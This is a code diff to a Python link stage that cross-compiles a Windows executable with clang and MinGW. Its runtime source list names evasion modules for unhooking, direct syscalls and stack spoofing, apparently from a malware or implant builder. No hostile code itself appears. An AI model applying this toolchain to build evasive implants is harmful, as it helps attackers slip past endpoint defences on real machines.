@@ -40,20 +40,16 @@ class LinkStage(Stage):
 
             runtime_objs = self._compile_runtime(tc, out_dir, target_os)
 
-            # Find lld-link binary
-            lld_link = self._find_lld_link()
-            win_libs = ["/defaultlib:ntdll", "/defaultlib:winhttp", "/defaultlib:dnsapi", "/defaultlib:wevtapi"]
-            if lld_link:
-                link_cmd = [
-                    str(lld_link), f"/out:{output}", "/subsystem:console", "/entry:main", str(obj_path)
-                ] + runtime_objs + win_libs
-                run_cmd(link_cmd, "Linking Windows PE executable (lld-link)")
-            else:
-                # Fallback to clang cross-linker
-                link_cmd = [
-                    str(tc.clang()), "--target=x86_64-pc-windows-gnu", str(obj_path)
-                ] + runtime_objs + ["-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi", "-o", str(output)]
-                run_cmd(link_cmd, "Linking Windows PE executable (clang)")
+            # Use clang cross-linker for Windows (MinGW path)
+            mingw_lib = "/usr/x86_64-w64-mingw32/lib"
+            link_cmd = [
+                str(tc.clang()), "--target=x86_64-pc-windows-gnu",
+                f"-L{mingw_lib}", str(obj_path)
+            ] + runtime_objs + [
+                "-lkernel32", "-luser32", "-ladvapi32", "-lws2_32", "-lwinhttp", "-ldnsapi",
+                "-o", str(output)
+            ]
+            run_cmd(link_cmd, "Linking Windows PE executable (clang)")
         else:
             # Linux target
             run_cmd([
@@ -98,6 +94,8 @@ class LinkStage(Stage):
         if target_os == "windows":
             windows_sources = [
                 runtime_dir / "util"         / "mem.c",
+                runtime_dir / "windows"      / "windows_utils.c",
+                runtime_dir / "windows"      / "registry" / "registry.c",
                 runtime_dir / "evasion"      / "unhook.c",
                 runtime_dir / "evasion"      / "syscalls.c",
                 runtime_dir / "evasion"      / "stack_spoof.c",
